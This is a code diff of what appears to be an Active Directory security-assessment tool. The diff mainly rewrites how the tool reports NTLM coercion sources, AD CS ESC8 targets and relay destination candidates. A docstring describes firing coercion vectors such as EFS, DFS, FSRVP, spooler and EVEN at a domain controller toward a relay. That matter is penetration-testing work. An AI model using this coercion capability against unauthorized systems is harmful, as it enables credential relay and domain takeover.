-        # == CONCLUSION ==
-        lines.append(c('  == CONCLUSION ==', C.BOLD + C.CYAN))
-        if coercibles:
-            cnames = ', '.join(e['label'] for e in coercibles)
-            lines.append(c('     Coercible via: %s' % cnames, C.YELLOW))
-            lines.append(c('       Reason: exposes an RPC method that reaches out '
-                           'to a UNC you supply', C.GREY))
-            # Carry the live-fire verdict so this agrees with the section above:
-            # "coercible" is the structural fact; the test result is the proof.
-            if self.do_coerce and not self.fuzz_dry_run:
-                conf = [e for e in coercibles if e['confirmed'] is True]
-                weak = [e for e in coercibles if e['confirmed'] is False
-                        and e.get('evidence', {}).get('connection')]
-                called = [e for e in coercibles if e['confirmed'] is False]
-                if conf:
-                    lines.append(c('       Live test: CONFIRMED by attempt-tagged '
-                                   'callback (%s)'
-                                   % ', '.join(e['label'] for e in conf),
-                                   C.BOLD + C.GREEN))
-                elif weak:
-                    lines.append(c('       Live test: callback observed without the '
-                                   'attempt tag (UNCONFIRMED)', C.YELLOW))
-                elif called:
-                    lines.append(c('       Live test: RPC call completed or '
-                                   'faulted, but no callback was observed '
-                                   '(UNCONFIRMED)', C.YELLOW))
-                else:
-                    lines.append(c('       Live test: fire did not complete this '
-                                   'run (vector valid, unproven)', C.GREY))
-        else:
-            lines.append(c('     Coercible: none found on this host', C.GREY))
-        if relay_viables:
-            tcpn = sum(1 for r in relay_viables if not r['is_pipe'])
-            lines.append(c('     RPC relay candidates: %d endpoint(s), %d over direct TCP'
-                           % (len(relay_viables), tcpn), C.YELLOW))
-            lines.append(c('       Evidence: CONNECT bind accepted; useful method '
-                           'authorization remains untested', C.GREY))
-        elif smb_signing is True:
-            lines.append(c('     RPC relay candidate: none observed; SMB signing '
-                           'closes named-pipe destinations', C.GREY))
-        else:
-            lines.append(c('     RPC relay candidate: none observed', C.GREY))
-        if self.relay_checks:
-            if ldap_viable:
-                lines.append(c('     Cross-protocol posture: %s candidate(s)'
-                               % ', '.join(ldap_viable), C.YELLOW))
-                if any(e.get('confirmed') for e in coercibles):
-                    lines.append(c('       Chain: POTENTIAL ONLY; transport, identity '
-                                   'and destination authorization must all match', C.GREY))
-            else:
-                lines.append(c('     Cross-protocol posture: no candidate observed '
-                               '(unknown is not proof of protection)', C.GREY))
+                lines.append(c('     AD CS web enrollment: No NTLM-enabled enrollment '
+                               'page was found.', C.GREY))
 
         # == LEVEL-2 FUZZ RESULTS ==
         fuzz_hits = []
         if self.do_fuzz:
-            lines.append(c('  == LEVEL-2 FUZZ RESULTS ==', C.BOLD + C.CYAN))
+            lines.append(c('  ADDITIONAL METHOD TESTS', C.BOLD + C.CYAN))
             if not self.fuzz_candidates:
                 lines.append(c('     No candidate list available (built-in list '
                                'empty and no --candidates file).', C.GREY))
@@ -2252,17 +2509,19 @@ class RPCAuthMap(object):
                                         c(fr['detail'], C.GREY)))
                     elif v == 'CALLBACK':
                         lines.append('     %s  %s %s  %s'
-                                     % (c('UNTAGGED CALLBACK', C.YELLOW),
+                                     % (c('UNCONFIRMED', C.YELLOW),
                                         c(lbl, C.BBLUE), c(tag, C.GREY),
-                                        c(fr['detail'], C.GREY)))
+                                        c('callback did not match the attempt tag', C.GREY)))
                     elif v == 'would-fire':
                         lines.append('     %s  %s %s  %s'
-                                     % (c('would fire', C.CYAN), c(lbl, C.BBLUE),
-                                        c(tag, C.GREY), c(fr['detail'], C.GREY)))
+                                     % (c('DRY RUN', C.CYAN), c(lbl, C.BBLUE),
+                                        c(tag, C.GREY), c('request selected but not sent',
+                                                           C.GREY)))
                     elif v == 'no callback':
                         lines.append('     %s  %s %s  %s'
-                                     % (c('no callback', C.GREY), c(lbl, C.BOLD),
-                                        c(tag, C.GREY), c(fr['detail'], C.GREY)))
+                                     % (c('UNCONFIRMED', C.GREY), c(lbl, C.BOLD),
+                                        c(tag, C.GREY), c('request sent; no callback received',
+                                                           C.GREY)))
                     else:
                         # rejected / skipped / nobind / capped: summarized, quiet
                         if self.show_all:
@@ -2271,11 +2530,11 @@ class RPCAuthMap(object):
                         else:
                             shown_quiet += 1
                 if shown_quiet and not self.show_all:
-                    lines.append(c('     (%d more rejected/skipped/no-bind; '
-                                   '--show-all to list)' % shown_quiet, C.GREY))
+                    lines.append(c('     %d other tests were rejected, skipped, or could '
+                                   'not connect. Use --show-all to list them.'
+                                   % shown_quiet, C.GREY))
                 if self.fuzz_dry_run:
-                    lines.append(c('     [dry run] nothing was actually fired.',
-                                   C.GREY))
+                    lines.append(c('     Dry run only. No requests were sent.', C.GREY))
 
         if self.show_all and detail_rows:
             lines.append(c('  == ALL INTERFACES (%d) ==' % len(detail_rows),
@@ -2409,98 +2668,82 @@ def _vis_pad(s, width):
 
 
 def render_engagement_summary(results):
-    """Final wrap-up: two side-by-side columns, coercible IPs on the left and
-    relay destinations on the right."""
-    left = []   # coercible-source cells
-    right = []  # relay-destination cells
-    grant = {'LDAP': 'signing posture; rights untested',
-             'LDAPS': 'channel-binding posture; rights untested',
-             'ADCS-ESC8': 'auth advertisement; enrollment untested',
-             'SMB/RPC': 'CONNECT bind; authorization untested'}
+    """Final findings in short sections, with important targets first."""
+    out = ['', c('  ENGAGEMENT SUMMARY', C.BOLD + C.CYAN),
+           c('  ' + '=' * 72, C.GREY)]
 
+    esc8_results = [r for r in results if r.get('esc8')]
+    if esc8_results:
+        out.append(c('  !!! POSSIBLE ESC8 TARGETS — REVIEW FIRST !!!', C.BRED))
+        for r in esc8_results:
+            out.append('    %s' % c(r['host'], C.BOLD))
+            out.append(c('      AD CS web enrollment advertises NTLM or Negotiate '
+                         'authentication.', C.BOLD))
+            out.append(c('      Certificate issuance was not tested. Domain compromise '
+                         'is not proven.', C.YELLOW))
+
+    source_results = [r for r in results
+                      if r.get('coercibles') or r.get('fuzz_hits')]
+    if source_results:
+        out.append('')
+        out.append(c('  COERCION SOURCE FINDINGS', C.BOLD))
+        for r in source_results:
+            out.append('    %s' % c(r['host'], C.BOLD))
+            for e in r.get('coercibles', []):
+                evidence = e.get('evidence', {})
+                if e.get('confirmed') is True:
+                    status = c('CONFIRMED', C.BOLD + C.GREEN)
+                    detail = 'unique callback tag matched'
+                elif e.get('confirmed') is False and evidence.get('connection'):
+                    status = c('UNCONFIRMED', C.YELLOW)
+                    detail = 'callback did not match the attempt tag'
+                elif e.get('confirmed') is False:
+                    status = c('UNCONFIRMED', C.YELLOW)
+                    detail = 'request sent; no callback received'
+                elif e.get('attempted'):
+                    status = c('TEST INCOMPLETE', C.YELLOW)
+                    detail = 'request could not be completed'
+                else:
+                    status = c('NOT TESTED', C.YELLOW)
+                    detail = 'possible coercion service found'
+                out.append('      %s: %s — %s' % (status, e['label'], detail))
+            for f in r.get('fuzz_hits', []):
+                label = f.get('known') or f.get('name') or 'additional method'
+                out.append('      %s: %s op%d — unique callback tag matched'
+                           % (c('CONFIRMED', C.BOLD + C.GREEN), label, f['opnum']))
+    else:
+        out.append('')
+        out.append(c('  No known coercion sources were identified in this run.', C.GREY))
+
+    destination_results = []
     for r in results:
-        if r.get('coercibles'):
-            labels = ', '.join(e['label'] for e in r['coercibles'])
-            conf = any(e.get('confirmed') for e in r['coercibles'])
-            verdict = (c('CONFIRMED', C.BOLD + C.GREEN) if conf
-                       else c('candidate', C.YELLOW))
-            left.append('%s  %s  %s' % (c(r['host'], C.BRED), verdict,
-                                        c(labels, C.BBLUE)))
-        # Hunt findings: only an attempt-tagged callback is a confirmed result.
-        fhits = r.get('fuzz_hits', [])
-        for f in [x for x in fhits if x['verdict'] == 'CONFIRMED']:
-            flabel = '%s op%d (fuzz)' % (f.get('known') or f['uuid'][:8],
-                                         f['opnum'])
-            left.append('%s  %s  %s' % (c(r['host'], C.BRED),
-                                        c('CONFIRMED', C.BOLD + C.GREEN),
-                                        c(flabel, C.BBLUE)))
-
-        tags = []
-        if r.get('ldap') and 'NOT required' in (r['ldap'] or ''):
-            tags.append('LDAP')
-        if r.get('ldaps') and 'NOT required' in (r['ldaps'] or ''):
-            tags.append('LDAPS')
-        if r.get('esc8'):
-            tags.append('ADCS-ESC8')
+        destinations = []
+        if 'NOT required' in (r.get('ldap') or ''):
+            destinations.append('LDAP signing is not required; relay not tested')
+        if 'NOT required' in (r.get('ldaps') or ''):
+            destinations.append('LDAPS channel binding is not required; relay not tested')
         if r.get('rpc_relay'):
-            tags.append('SMB/RPC')
-        if tags:
-            gtxt = '; '.join('%s=%s' % (t, grant[t]) for t in tags)
-            right.append('%s  %s' % (c(r['host'], C.BRED),
-                                     c(' '.join(tags), C.BOLD)
-                                     + c('  (%s)' % gtxt, C.GREY)))
-
-    if not left and not right:
-        return ''
-
-    # Column widths from visible lengths, with a padded gap and a separator.
-    lhead = 'COERCIBLE IPs'
-    rhead = 'RELAY DESTINATIONS'
-    sep = '   |   '
-    lwidth = max([len(strip_ansi(x)) for x in left] + [len(lhead)]) + 4
-    rows = max(len(left), len(right))
-    total = lwidth + len(sep) + max([len(strip_ansi(x)) for x in right]
-                                    + [len(rhead)])
-
-    # These are posture observations, not proof of an exploitable chain.
-    dc_ips = [r['host'] for r in results if (r.get('ldap') or '') == 'required']
-    adcs = [r for r in results if r.get('esc8')]
-    destinations = sorted(set(
-        [r['host'] for r in results if 'NOT required' in (r.get('ldap') or '')]
-        + [r['host'] for r in results if 'NOT required' in (r.get('ldaps') or '')]
-        + [r['host'] for r in results if r.get('esc8')]))
-
-    out = []
-    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
-    out.append('  %s' % c('SUMMARY', C.BOLD + C.CYAN))
-    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
-    if dc_ips or adcs or destinations:
-        if dc_ips:
-            out.append('  %s %s'
-                       % (c('LDAP SIGNING REQUIRED:', C.BOLD + C.YELLOW),
-                          c(', '.join(dc_ips), C.BRED)))
-        for r in adcs:
-            out.append('  %s %s   %s'
-                       % (c('ADCS WEB AUTH:      ', C.BOLD + C.YELLOW),
-                          c(r['host'], C.BRED),
-                          c(r['esc8'][0], C.GREY)))
+            count = len(r['rpc_relay'])
+            destinations.append(
+                '%d RPC %s accepted a basic connection; permissions not tested'
+                % (count, 'service' if count == 1 else 'services'))
         if destinations:
-            out.append('  %s %s'
-                       % (c('CANDIDATE DESTINATIONS:', C.BOLD + C.YELLOW),
-                          c(', '.join(destinations)
-                            + ' - identity, transport and authorization unproven',
-                            C.GREY)))
-        out.append('  %s' % c('-' * total, C.GREY))
-    out.append('  %s%s%s' % (_vis_pad(c(lhead, C.BOLD), lwidth), c(sep, C.GREY),
-                             c(rhead, C.BOLD)))
-    out.append('  %s' % c('-' * total, C.GREY))
-    for i in range(rows):
-        lcell = left[i] if i < len(left) else ''
-        rcell = right[i] if i < len(right) else ''
-        out.append('  %s%s%s' % (_vis_pad(lcell, lwidth), c(sep, C.GREY), rcell))
-    out.append('  %s' % c('=' * total, C.BOLD + C.CYAN))
-    return '\n'.join(out)
+            destination_results.append((r['host'], destinations))
 
+    if destination_results:
+        out.append('')
+        out.append(c('  RELAY DESTINATION CANDIDATES', C.BOLD))
+        for host, destinations in destination_results:
+            out.append('    %s' % c(host, C.BOLD))
+            for destination in destinations:
+                out.append(c('      %s' % destination, C.GREY))
+        out.append(c('    No relay was performed by these checks.', C.YELLOW))
+    elif not esc8_results:
+        out.append('')
+        out.append(c('  No relay destination candidates were identified in this run.', C.GREY))
+
+    out.append(c('  ' + '=' * 72, C.GREY))
+    return '\n'.join(out)
 
 def parse_creds(prefix):
     domain = ''
@@ -2596,7 +2839,7 @@ def _auth_check(dc, domain, username, password, lmhash, nthash, timeout):
 
 def _fire_all_coercions(dc, domain, username, password, hashes, listener_ip,
                         timeout):
-    """Fire every known coercion vector (EFS, DFS, FSRVP, spooler) at the DC
+    """Fire every known coercion vector (EFS, DFS, FSRVP, spooler, EVEN) at the DC
     with a UNC pointing at our relay, reusing the tool's proven coercion path so
     the auth level, transport fallback, and error handling are correct. No
     callback listener: the relay server is what catches the auth. Prints a
